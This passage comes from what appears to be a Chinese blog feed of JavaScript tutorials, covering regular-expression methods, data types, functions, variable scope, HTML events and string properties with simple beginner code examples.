id="5-4-1-使用-test"><a href="#5-4-1-使用-test" class="headerlink" title="5.4.1 使用 test()"></a>5.4.1 使用 test()</h4><p>test() 方法是一个正则表达式方法。test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。</p><p>使用实例：搜索字符串中的字符 “e”</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> patt = <span class="hljs-regexp">/e/</span>;<br>patt.test(<span class="hljs-string">&quot;The best things in life are free!&quot;</span>);<br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-literal">true</span><br></code></pre></div></td></tr></table></figure><h4 id="5-4-2-使用-exec"><a href="#5-4-2-使用-exec" class="headerlink" title="5.4.2 使用 exec()"></a>5.4.2 使用 exec()</h4><p>exec() 方法是一个正则表达式方法。exec() 方法用于检索字符串中的正则表达式的匹配。该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。</p><p>使用实例：搜索字符串中的字母 “e”</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">/e/.exec(<span class="hljs-string">&quot;The best things in life are free!&quot;</span>);<br><span class="hljs-comment">/*输出结果*/</span><br>e<br></code></pre></div></td></tr></table></figure><h4 id="5-4-3-使用-compile"><a href="#5-4-3-使用-compile" class="headerlink" title="5.4.3 使用 compile()"></a>5.4.3 使用 compile()</h4><p>compile() 方法用于改变 RegExp。compile() 既可以改变检索模式，也可以添加或删除第二个参数。</p><p>使用实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> patt1=<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&quot;e&quot;</span>); <span class="hljs-built_in">document</span>.write(patt1.test(<span class="hljs-string">&quot;The best things in life are free&quot;</span>)); patt1.compile(<span class="hljs-string">&quot;d&quot;</span>); <span class="hljs-built_in">document</span>.write(patt1.test(<span class="hljs-string">&quot;The best things in life are free&quot;</span>));<br><span class="hljs-comment">/*输出结果*/</span><br>truefalse      <span class="hljs-comment">/*因为字符串中存在 &quot;e&quot;，而没有 &quot;d&quot;*/</span><br></code></pre></div></td></tr></table></figure><h3 id="5-5-JavaScript-正则表达式学习导图"><a href="#5-5-JavaScript-正则表达式学习导图" class="headerlink" title="5.5 JavaScript 正则表达式学习导图"></a>5.5 JavaScript 正则表达式学习导图</h3><p><img src="https://img-blog.csdnimg.cn/20210517131831894.gif"></p><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-JavaScript学习（三）</title>
    <link href="/2021/05/18/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/05/18/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JavaScript 是世界上最流行的脚本语言。 JavaScript 是属于 web 的语言，它适用于 PC、笔记本电脑、平板电脑和移动电话。 JavaScript 被设计为向 HTML 页面增加交互性。 许多 HTML 开发者都不是程序员，但是 JavaScript 却拥有非常简单的语法。几乎每个人都有能力将小的 JavaScript 片段添加到网页中。所有现代的 HTML 页面都使用 JavaScript，可以用于改进设计、验证表单、检测浏览器、创建cookies等。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-JavaScript-数据类型"><a href="#1-JavaScript-数据类型" class="headerlink" title="1.JavaScript 数据类型"></a>1.JavaScript 数据类型</h2><p>字符串（String）、数字(Number)、布尔(Boolean)、数组(Array)、对象(Object)、空（Null）、未定义（Undefined）。</p><h3 id="1-1-动态类型"><a href="#1-1-动态类型" class="headerlink" title="1.1 动态类型"></a>1.1 动态类型</h3><p>JavaScript 拥有动态类型。这意味着相同的变量可用作不同的类型。<br>使用实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x;               <span class="hljs-comment">// x 为 undefined</span><br><span class="hljs-keyword">var</span> x = <span class="hljs-number">5</span>;           <span class="hljs-comment">// 现在 x 为数字</span><br><span class="hljs-keyword">var</span> x = <span class="hljs-string">&quot;John&quot;</span>;      <span class="hljs-comment">// 现在 x 为字符串</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-字符串（String）"><a href="#1-2-字符串（String）" class="headerlink" title="1.2 字符串（String）"></a>1.2 字符串（String）</h3><p>字符串是存储字符（比如 “Bill Gates”）的变量。字符串可以是引号中的任意文本。可以使用单引号或双引号。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> carname=<span class="hljs-string">&quot;Volvo XC60&quot;</span>;<br><span class="hljs-keyword">var</span> carname=<span class="hljs-string">&#x27;Volvo XC60&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p>可以在字符串中使用引号，只要不匹配包围字符串的引号即可。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> answer=<span class="hljs-string">&quot;It&#x27;s alright&quot;</span>;<br><span class="hljs-keyword">var</span> answer=<span class="hljs-string">&quot;He is called &#x27;Johnny&#x27;&quot;</span>;<br><span class="hljs-keyword">var</span> answer=<span class="hljs-string">&#x27;He is called &quot;Johnny&quot;&#x27;</span>;<br></code></pre></div></td></tr></table></figure><h3 id="1-3-数字（Number）"><a href="#1-3-数字（Number）" class="headerlink" title="1.3 数字（Number）"></a>1.3 数字（Number）</h3><p>JavaScript 只有一种数字类型。数字可以带小数点，也可以不带。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x1=<span class="hljs-number">34.00</span>;      <span class="hljs-comment">// 使用小数点来写</span><br><span class="hljs-keyword">var</span> x2=<span class="hljs-number">34</span>;         <span class="hljs-comment">// 不使用小数点来写</span><br></code></pre></div></td></tr></table></figure><p>极大或极小的数字可以通过科学（指数）计数法来写。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> y=<span class="hljs-number">123e5</span>;      <span class="hljs-comment">// 12300000</span><br><span class="hljs-keyword">var</span> z=<span class="hljs-number">123e-5</span>;     <span class="hljs-comment">// 0.00123</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-布尔（Boolean）"><a href="#1-4-布尔（Boolean）" class="headerlink" title="1.4 布尔（Boolean）"></a>1.4 布尔（Boolean）</h3><p>布尔（逻辑）只能有两个值：true 或 false。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-literal">true</span>;<br><span class="hljs-keyword">var</span> y=<span class="hljs-literal">false</span>;<br></code></pre></div></td></tr></table></figure><h3 id="1-5-数组（Array）"><a href="#1-5-数组（Array）" class="headerlink" title="1.5 数组（Array）"></a>1.5 数组（Array）</h3><p>创建数组：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> cars=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br>cars[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;Saab&quot;</span>;<br>cars[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;Volvo&quot;</span>;<br>cars[<span class="hljs-number">2</span>]=<span class="hljs-string">&quot;BMW&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>或者：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> cars=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-string">&quot;Saab&quot;</span>,<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>或者：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> cars=[<span class="hljs-string">&quot;Saab&quot;</span>,<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>];<br></code></pre></div></td></tr></table></figure><p>数组下标是基于零的，所以第一个项目是 [0]，第二个是 [1]，以此类推。</p><h3 id="1-6-对象（Object）"><a href="#1-6-对象（Object）" class="headerlink" title="1.6 对象（Object）"></a>1.6 对象（Object）</h3><p>对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person=&#123;<span class="hljs-attr">firstname</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">lastname</span>:<span class="hljs-string">&quot;Doe&quot;</span>, <span class="hljs-attr">id</span>:<span class="hljs-number">5566</span>&#125;;<br></code></pre></div></td></tr></table></figure><p>声明可横跨多行：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> person=&#123;<br>firstname : <span class="hljs-string">&quot;John&quot;</span>,<br>lastname  : <span class="hljs-string">&quot;Doe&quot;</span>,<br>id        :  <span class="hljs-number">5566</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>对象属性有两种寻址方式：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">name=person.lastname;<br>name=person[<span class="hljs-string">&quot;lastname&quot;</span>];<br></code></pre></div></td></tr></table></figure><h3 id="1-7-空（Null）"><a href="#1-7-空（Null）" class="headerlink" title="1.7 空（Null）"></a>1.7 空（Null）</h3><p>Undefined 这个值表示变量不含有值。可以通过将变量的值设置为 null 来清空变量。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">cars=<span class="hljs-literal">null</span>;<br>person=<span class="hljs-literal">null</span>;<br></code></pre></div></td></tr></table></figure><h3 id="1-8-声明变量类型"><a href="#1-8-声明变量类型" class="headerlink" title="1.8 声明变量类型"></a>1.8 声明变量类型</h3><p>当声明新变量时，可以使用关键词 “new” 来声明其类型。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> carname=<span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>;<br><span class="hljs-keyword">var</span> x=      <span class="hljs-keyword">new</span> <span class="hljs-built_in">Number</span>;<br><span class="hljs-keyword">var</span> y=      <span class="hljs-keyword">new</span> <span class="hljs-built_in">Boolean</span>;<br><span class="hljs-keyword">var</span> cars=   <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>;<br><span class="hljs-keyword">var</span> person= <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>;<br></code></pre></div></td></tr></table></figure><p>JavaScript 变量均为对象。当您声明一个变量时，就创建了一个新的对象。</p><h3 id="1-9-JavaScript数据类型学习脑图"><a href="#1-9-JavaScript数据类型学习脑图" class="headerlink" title="1.9 JavaScript数据类型学习脑图"></a>1.9 JavaScript数据类型学习脑图</h3><p><img src="https://img-blog.csdnimg.cn/20210517131813963.gif"></p><h2 id="2-JavaScript-函数"><a href="#2-JavaScript-函数" class="headerlink" title="2.JavaScript 函数"></a>2.JavaScript 函数</h2><p>在JavaScript中，函数即对象，可以随意地被程序操控，函数可以嵌套在其他函数中定义，这样可以访问它们被定义时所处的作用域中的任何变量。函数是由事件驱动的或者当它被调用时执行的可重复使用的代码块。<br>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">alert(<span class="hljs-string">&quot;Hello World!&quot;</span>);</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;myFunction()&quot;</span>&gt;</span>Try it<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-1-函数语法"><a href="#2-1-函数语法" class="headerlink" title="2.1 函数语法"></a>2.1 函数语法</h3><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">functionname</span>(<span class="hljs-params"></span>)</span>&#123;<br>执行代码<br> &#125;<br></code></pre></div></td></tr></table></figure><p>当调用该函数时，会执行函数内的代码。可以在某事件发生时直接调用函数（比如当用户点击按钮时），并且可由 JavaScript 在任何位置进行调用。</p><p>JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。function 中的花括号是必需的，即使函数体内只包含一条语句，仍然必须使用花括号将其括起来。</p><h3 id="2-2-调用带参数的函数"><a href="#2-2-调用带参数的函数" class="headerlink" title="2.2 调用带参数的函数"></a>2.2 调用带参数的函数</h3><p>在调用函数时，可以向其传递值，这些值被称为参数。这些参数可以在函数中使用。可以发送任意多的参数，由逗号 (,) 分隔。</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">my<span class="hljs-constructor">Function(<span class="hljs-params">argument1</span>,<span class="hljs-params">argument2</span>)</span><br></code></pre></div></td></tr></table></figure><p>当声明函数时，需要把参数作为变量来声明。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params">var1,var2</span>)</span>&#123;<br>代码<br> &#125;<br></code></pre></div></td></tr></table></figure><p>变量和参数必须以一致的顺序出现。第一个变量就是第一个被传递的参数的给定的值，以此类推。</p><p>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;button onclick=<span class="hljs-string">&quot;myFunction(&#x27;Harry Potter&#x27;,&#x27;Wizard&#x27;)&quot;</span>&gt;Try it&lt;/button&gt;<br><br>&lt;script&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params">name,job</span>)</span>&#123;<br>alert(<span class="hljs-string">&quot;Welcome &quot;</span> + name + <span class="hljs-string">&quot;, the &quot;</span> + job);<br>&#125;<br>&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><h3 id="2-3-带有返回值的函数"><a href="#2-3-带有返回值的函数" class="headerlink" title="2.3 带有返回值的函数"></a>2.3 带有返回值的函数</h3><p>通过使用 return 语句实现。在使用 return 语句时，函数会停止执行，并返回指定的值。</p><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">var</span> x=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>函数会返回值 5。<br>整个 JavaScript 并不会停止执行，仅仅是函数。JavaScript 将继续从调用函数的地方执行代码。</p><p>若仅仅希望退出函数时 ，也可使用 return 语句。返回值是可选的。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params">a,b</span>)</span>&#123;<br><span class="hljs-keyword">if</span> (a&gt;b)&#123;<br>  <span class="hljs-keyword">return</span>;<br>  &#125;<br>x=a+b<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-4-局部变量"><a href="#2-4-局部变量" class="headerlink" title="2.4 局部变量"></a>2.4 局部变量</h3><p>在 JavaScript 函数内部声明的变量（使用 var）是局部变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。只要函数运行完毕，本地变量就会被删除。局部变量比同名全局变量的优先级高，所以局部变量会隐藏同名的全局变量。</p><h3 id="2-5-全局变量"><a href="#2-5-全局变量" class="headerlink" title="2.5 全局变量"></a>2.5 全局变量</h3><p>在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问。</p><h3 id="2-6-变量的生存期"><a href="#2-6-变量的生存期" class="headerlink" title="2.6 变量的生存期"></a>2.6 变量的生存期</h3><p>JavaScript 变量的生命期从它们被声明的时间开始。局部变量会在函数运行以后被删除。全局变量会在页面关闭后被删除。</p><h3 id="2-7-向未声明的变量分配值"><a href="#2-7-向未声明的变量分配值" class="headerlink" title="2.7 向未声明的变量分配值"></a>2.7 向未声明的变量分配值</h3><p>如果把值赋给尚未声明的变量，该变量将被自动作为全局变量声明。即使它在函数内执行。<br>实例：</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">carname</span>=<span class="hljs-string">&quot;Volvo&quot;</span><span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-8-JavaScript函数学习脑图"><a href="#2-8-JavaScript函数学习脑图" class="headerlink" title="2.8 JavaScript函数学习脑图"></a>2.8 JavaScript函数学习脑图</h3><p><img src="https://img-blog.csdnimg.cn/20210517131703960.gif"></p><h2 id="3-JavaScript-作用域"><a href="#3-JavaScript-作用域" class="headerlink" title="3.JavaScript 作用域"></a>3.JavaScript 作用域</h2><p>作用域是可访问变量的集合。在JavaScript中，能够定义全局作用域或者局部作用域。<br>对象和函数同样也是变量。在 JavaScript 中, 作用域为可访问变量，对象，函数的集合。<br>JavaScript 函数作用域: 作用域在函数内修改。</p><h3 id="3-1-局部作用域"><a href="#3-1-局部作用域" class="headerlink" title="3.1 局部作用域"></a>3.1 局部作用域</h3><p>变量在函数内声明，变量为局部作用域。局部变量：只能在函数内部访问。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">// 此处不能调用 carName 变量</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> carName = <span class="hljs-string">&quot;Volvo&quot;</span>;<br>    <span class="hljs-comment">// 函数内可调用 carName 变量</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>因为局部变量只作用于函数内，所以不同的函数可以使用相同名称的变量。局部变量在函数开始执行时创建，函数执行完后局部变量会自动销毁。</p><h3 id="3-2-全局变量"><a href="#3-2-全局变量" class="headerlink" title="3.2 全局变量"></a>3.2 全局变量</h3><p>变量在函数外定义，即为全局变量。全局变量有 全局作用域: 网页中所有脚本和函数均可使用。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> carName = <span class="hljs-string">&quot; Volvo&quot;</span>;<br><span class="hljs-comment">// 此处可调用 carName 变量</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myFunction</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 函数内可调用 carName 变量</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量。</p><h3 id="3-3-变量生命周期"><a href="#3-3-变量生命周期" class="headerlink" title="3.3 变量生命周期"></a>3.3 变量生命周期</h3><p>JavaScript 变量生命周期在它声明时初始化。局部变量在函数执行完毕后销毁。全局变量在页面关闭后销毁。</p><h3 id="3-4-函数参数"><a href="#3-4-函数参数" class="headerlink" title="3.4 函数参数"></a>3.4 函数参数</h3><p>函数参数只在函数内起作用，是局部变量。</p><h3 id="3-5-扩展"><a href="#3-5-扩展" class="headerlink" title="3.5 扩展"></a>3.5 扩展</h3><p>全局变量，或者函数，可以覆盖 window 对象的变量或者函数。局部变量，包括 window 对象可以覆盖全局变量和函数。</p><p>在 ES6 中，提供了 let 关键字和 const 关键字。let 的声明方式与 var 相同，用 let 来代替 var 来声明变量，就可以把变量限制在当前代码块中。使用 const 声明的是常量，其值一旦被设定便不可被更改。</p><h2 id="4-JavaScript-事件"><a href="#4-JavaScript-事件" class="headerlink" title="4.JavaScript 事件"></a>4.JavaScript 事件</h2><p>事件是可以被 JavaScript 侦测到的行为。HTML 事件是发生在 HTML 元素上的事情。当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p><p>HTML 事件可以是浏览器行为，也可以是用户行为。HTML 网页中的每个元素都可以产生某些可以触发 JavaScript 函数的事件。在事件触发时 JavaScript 可以执行一些代码。HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。</p><p>常见HTML事件列表：</p><table><thead><tr><th align="center">事件</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">onchange</td><td align="center">HTML 元素改变</td></tr><tr><td align="center">onclick</td><td align="center">用户点击 HTML 元素</td></tr><tr><td align="center">onmouseover</td><td align="center">用户在一个HTML元素上移动鼠标</td></tr><tr><td align="center">onmouseout</td><td align="center">用户从一个HTML元素上移开鼠标</td></tr><tr><td align="center">onkeydown</td><td align="center">用户按下键盘按键</td></tr><tr><td align="center">onload</td><td align="center">浏览器已完成页面的加载</td></tr></tbody></table><h3 id="4-1-使用实例"><a href="#4-1-使用实例" class="headerlink" title="4.1 使用实例"></a>4.1 使用实例</h3><blockquote><ol><li>按钮元素中添加了 onclick 属性，点击修改 id=”demo” 元素的内容。</li></ol></blockquote><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&#x27;getElementById(&quot;demo&quot;).innerHTML=Date()&#x27;</span>&gt;</span>The time is?<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>修改自身元素的内容 (使用 this.innerHTML)</li></ol></blockquote><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;this.innerHTML=Date()&quot;</span>&gt;</span>The time is?<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="5-JavaScript-字符串"><a href="#5-JavaScript-字符串" class="headerlink" title="5.JavaScript 字符串"></a>5.JavaScript 字符串</h2><p>JavaScript 字符串用于存储和处理文本。字符串可以是插入到引号中的任何字符。你可以使用单引号或双引号。</p><h3 id="5-1-字符串属性"><a href="#5-1-字符串属性" class="headerlink" title="5.1 字符串属性"></a>5.1 字符串属性</h3><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">constructor</td><td align="center">返回创建字符串属性的函数</td></tr><tr><td align="center">length</td><td align="center">返回字符串的长度</td></tr><tr><td align="center">prototype</td><td align="center">允许您向对象添加属性和方法</td></tr></tbody></table><h3 id="5-2-字符串方法"><a href="#5-2-字符串方法" class="headerlink" title="5.2 字符串方法"></a>5.2 字符串方法</h3><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">charAt()</td><td align="center">返回指定索引位置的字符</td></tr><tr><td align="center">charCodeAt()</td><td align="center">返回指定索引位置字符的 Unicode 值</td></tr><tr><td align="center">concat()</td><td align="center">连接两个或多个字符串，返回连接后的字符串</td></tr><tr><td align="center">fromCharCode()</td><td align="center">将指定的 Unicode 值转换为字符串</td></tr><tr><td align="center">indexOf()</td><td align="center">返回字符串中检索指定字符第一次出现的位置</td></tr><tr><td align="center">lastIndexOf()</td><td align="center">返回字符串中检索指定字符最后一次出现的位置</td></tr><tr><td align="center">localeCompare()</td><td align="center">用本地特定的顺序来比较两个字符串</td></tr><tr><td align="center">match()</td><td 